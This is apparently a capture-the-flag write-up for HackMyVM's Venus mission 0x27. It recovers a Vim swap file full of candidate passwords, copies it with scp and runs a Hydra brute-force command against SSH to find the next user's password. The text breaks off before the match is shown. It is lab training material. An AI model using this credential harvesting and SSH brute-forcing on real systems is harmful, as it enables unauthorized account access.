# Mission 0x27

## 🔎 Solution
After connecting through SSH as *ariel*, the goal is to obtain the password for the next user, *lola*.
```
ariel@venus:~$ cat mission.txt 
################
# MISSION 0x27 #
################

## EN ##
Seems that ariel dont save the password for lola, but there is a temporal file.
```

In the current directory, there is a `.goas.swp` file. 
This type of file is typically created by Vim (or Vi) to temporarily store unsaved buffer data, including text, undo history, and editing state.
```
ariel@venus:~$ cat .goas.swp 
k�����}jWD1pad�eb11~teste/goas
           �������snmk[K;qkBjHcaJqkBjHcaJqkBjHcaJ-->VVjqJGRrnfKmcgD-->bnQgcXYamhSDSff-->QsymOOVbzSaKmRm-->cbjYGSvqAsqIvdg-->LkWReDaaLCMDlLf-->DabEJLmAbOQxEnD-->mYhQVLDKdJrsIwG-->d3LieOzRGX5wud6-->EKvJoTBYlwtwFmv-->PEOppdOkSqJZweH-->rSkPlPhymYcerMJ-->GBUguuSpXVjpxLc-->NdnszvjulNellbK-->IaOpTdAuhSjGZnu-->RGBEMbZHZRgXZnu--rxhKeFKveeKqpwp-->cOXlRYXtJWnVQEG-->ppkJjqYvSCIyAhKThats my little DIc with my old and current passw0rds:
```

To inspect it more cleanly, the file is transferred to the local machine:
```
scp -P 5000 ariel@venus.hackmyvm.eu:/pwned/ariel/.goas.swp .
```

The file is then recovered using Vim:
```
vim -r .goas.swp 
```

After opening, the recovered content is saved to a readable file:
```
:w recovered.txt
```

The recovered file contains multiple candidate passwords that could belong to *lola*:
```
> cat recovered.txt           
Thats my little DIc with my old and current passw0rds:

To determine which one is valid, Hydra is used to perform a targeted brute-force attempt over SSH. 
The successful match is:
```
> hydra -l lola -P recovered.txt -s 5000 ssh://venus.hackmyvm.eu
